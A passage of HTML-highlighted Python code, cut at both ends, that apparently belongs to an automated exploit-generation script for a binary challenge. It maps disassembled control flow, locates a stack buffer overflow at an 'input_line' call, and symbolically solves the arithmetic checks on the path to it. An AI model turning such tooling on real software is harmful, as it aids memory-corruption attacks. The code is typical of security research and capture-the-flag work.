</span></span><span class=line><span class=cl>        <span class=n>ary</span> <span class=o>=</span> <span class=n>line</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\t</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>=</span> <span class=n>ary</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>instruction</span> <span class=o>=</span> <span class=n>ary</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;#&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ary</span> <span class=o>=</span> <span class=n>instruction</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=n>maxsplit</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>ary</span><span class=p>)</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>opcode</span><span class=p>,</span> <span class=n>args</span> <span class=o>=</span> <span class=n>ary</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>opcode</span> <span class=o>=</span> <span class=n>ary</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>args</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>args</span> <span class=o>=</span> <span class=n>args</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ins</span> <span class=o>=</span> <span class=n>Ins</span><span class=p>(</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>index</span><span class=o>=</span><span class=nb>len</span><span class=p>(</span><span class=n>instructions</span><span class=p>),</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>addr</span><span class=o>=</span><span class=n>addr</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>opcode</span><span class=o>=</span><span class=n>opcode</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>args</span><span class=o>=</span><span class=n>args</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>exits</span><span class=o>=</span><span class=p>[],</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>choice</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>target</span> <span class=o>=</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>opcode</span> <span class=o>==</span> <span class=s1>&#39;jmp&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>ins</span><span class=o>.</span><span class=n>exits</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>reverse_map</span><span class=o>.</span><span class=n>setdefault</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=p>[])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>reverse_map</span><span class=p>[</span><span class=n>target</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;je&#39;</span><span class=p>,</span> <span class=s1>&#39;jne&#39;</span><span class=p>,</span> <span class=s1>&#39;jg&#39;</span><span class=p>,</span> <span class=s1>&#39;jbe&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>ins</span><span class=o>.</span><span class=n>exits</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>ins</span><span class=o>.</span><span class=n>exits</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>reverse_map</span><span class=o>.</span><span class=n>setdefault</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=p>[])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>reverse_map</span><span class=p>[</span><span class=n>target</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>ins</span><span class=o>.</span><span class=n>exits</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>opcode</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;j&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s1>&#39;unhandled jmp: </span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>opcode</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>instructions</span><span class=p>)</span> <span class=ow>and</span> <span class=n>instructions</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>exits</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>instructions</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>exits</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>addr</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>reverse_map</span><span class=o>.</span><span class=n>setdefault</span><span class=p>(</span><span class=n>addr</span><span class=p>,</span> <span class=p>[])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>reverse_map</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>instructions</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>instructions</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>ins</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>mapping</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span> <span class=o>=</span> <span class=n>ins</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>ins</span> <span class=ow>in</span> <span class=n>instructions</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>ins</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>instructions</span><span class=p>,</span> <span class=n>mapping</span><span class=p>,</span> <span class=n>reverse_map</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>find_overflow</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pattern</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;\[rbp-(\w+)\]&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>ins</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>instructions</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span> <span class=o>==</span> <span class=s1>&#39;call&#39;</span> <span class=ow>and</span> <span class=s1>&#39;input_line&#39;</span> <span class=ow>in</span> <span class=n>ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>lea_rax_rbp</span> <span class=o>=</span> <span class=n>instructions</span><span class=p>[</span><span class=n>i</span><span class=o>-</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>assert</span> <span class=n>lea_rax_rbp</span><span class=o>.</span><span class=n>opcode</span> <span class=o>==</span> <span class=s1>&#39;lea&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>assert</span> <span class=n>lea_rax_rbp</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;rax&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>mo</span> <span class=o>=</span> <span class=n>pattern</span><span class=o>.</span><span class=k>match</span><span class=p>(</span><span class=n>lea_rax_rbp</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>mo</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s1>&#39;opcode incorrect: </span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>lea_rax_rbp</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>offset</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>mo</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>mov_esi</span> <span class=o>=</span> <span class=n>instructions</span><span class=p>[</span><span class=n>i</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>assert</span> <span class=n>mov_esi</span><span class=o>.</span><span class=n>opcode</span> <span class=o>==</span> <span class=s1>&#39;mov&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>assert</span> <span class=n>mov_esi</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;esi&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>length</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>mov_esi</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>length</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>i</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>length</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>find_path</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>addr</span> <span class=o>=</span> <span class=n>instructions</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span><span class=o>.</span><span class=n>addr</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>path</span> <span class=o>=</span> <span class=p>[</span><span class=n>addr</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>prev</span> <span class=o>=</span> <span class=n>reverse_map</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>prev</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s1>&#39;multiple path: </span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>prev</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>prev</span> <span class=o>=</span> <span class=n>prev</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>mapping</span><span class=p>[</span><span class=n>prev</span><span class=p>]</span><span class=o>.</span><span class=n>choice</span> <span class=o>=</span> <span class=n>addr</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>=</span> <span class=n>prev</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>path</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>mapping</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span><span class=o>.</span><span class=n>index</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>p</span> <span class=ow>in</span> <span class=n>path</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>operand</span><span class=p>:</span><span class=nb>str</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>BitVecVal</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>operand</span><span class=p>,</span> <span class=mi>0</span><span class=p>),</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>symbols</span><span class=p>[</span><span class=n>operand</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>store</span><span class=p>(</span><span class=n>symbols</span><span class=p>:</span><span class=nb>dict</span><span class=p>,</span> <span class=n>operand</span><span class=p>:</span><span class=nb>str</span><span class=p>,</span> <span class=n>value</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>symbols</span><span class=p>[</span><span class=n>operand</span><span class=p>]</span> <span class=o>=</span> <span class=n>value</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>solver</span><span class=p>,</span> <span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>parse</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>size</span><span class=o>=</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>parse</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>size</span><span class=o>=</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=n>a</span> <span class=o>+</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>store</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sub</span><span class=p>(</span><span class=n>solver</span><span class=p>,</span> <span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>parse</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>size</span><span class=o>=</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>parse</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>size</span><span class=o>=</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=n>a</span> <span class=o>-</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>store</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>imul</span><span class=p>(</span><span class=n>solver</span><span class=p>,</span> <span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>parse</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>size</span><span class=o>=</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>parse</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>size</span><span class=o>=</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=n>a</span> <span class=o>*</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>store</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor</span><span class=p>(</span><span class=n>solver</span><span class=p>,</span> <span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>parse</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>size</span><span class=o>=</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>parse</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>size</span><span class=o>=</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=n>a</span> <span class=o>^</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>store</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>mov</span><span class=p>(</span><span class=n>solver</span><span class=p>,</span> <span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>parse</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>store</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>bitwise_not</span><span class=p>(</span><span class=n>solver</span><span class=p>,</span> <span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>parse</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>size</span><span class=o>=</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=o>~</span><span class=n>a</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>store</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>cmp</span><span class=p>(</span><span class=n>solver</span><span class=p>,</span> <span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>parse</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>parse</span><span class=p>(</span><span class=n>symbols</span><span class=p>,</span> <span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>solver</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>a</span> <span class=o>==</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_math</span><span class=p>(</span><span class=n>block</span><span class=p>,</span> <span class=k>match</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;solve_math&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>block</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># DWORD PTR [rbp-0x5e0]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pattern</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;DWORD PTR \[rbp-(\w+)\]&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>solver</span> <span class=o>=</span> <span class=n>Solver</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>symbols</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>user_input</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ops</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;mov&#39;</span><span class=p>:</span> <span class=n>mov</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;add&#39;</span><span class=p>:</span> <span class=n>add</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;sub&#39;</span><span class=p>:</span> <span class=n>sub</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;cmp&#39;</span><span class=p>:</span> <span class=n>cmp</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;xor&#39;</span><span class=p>:</span> <span class=n>xor</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;imul&#39;</span><span class=p>:</span> <span class=n>imul</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>block</span><span class=p>):</span>
